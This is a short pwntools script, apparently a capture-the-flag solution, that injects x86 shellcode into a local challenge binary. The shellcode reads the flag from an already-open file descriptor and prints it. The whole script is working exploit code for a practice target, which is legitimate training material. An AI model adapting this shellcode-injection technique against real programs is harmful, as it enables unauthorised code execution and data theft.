#!/usr/bin/env python2

from pwn import *

# goal:
#   read flag.txt
#   print contents of the file

p = process('./simple')

p.recvuntil('enter your shellcode:')

# sub esp, 100 ; make room for buffer

shellcode = '''
   sub esp, 100
   mov eax, 3
   mov ebx, 1000
   mov ecx, esp
   mov edx, 100
   int 0x80
   mov eax, 4
   mov ebx, 1
   mov ecx, esp
   mov edx, 100
   int 0x80
'''

p.sendline(asm(shellcode))

p.interactive()
